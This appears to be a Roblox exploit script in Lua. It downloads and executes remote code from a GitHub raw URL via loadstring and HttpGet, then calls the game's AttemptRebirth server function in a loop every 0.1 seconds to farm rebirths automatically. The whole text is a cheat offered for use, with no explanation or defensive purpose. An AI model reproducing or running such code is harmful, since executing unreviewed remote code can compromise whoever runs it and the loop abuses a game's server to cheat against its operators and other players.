loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0sonic11"))()

while wait(0.1) do
    local args = {
    [1] = true
}

game:GetService("ReplicatedStorage").Knit.Services.SSLevelingService.RF.AttemptRebirth:InvokeServer(unpack(args))
end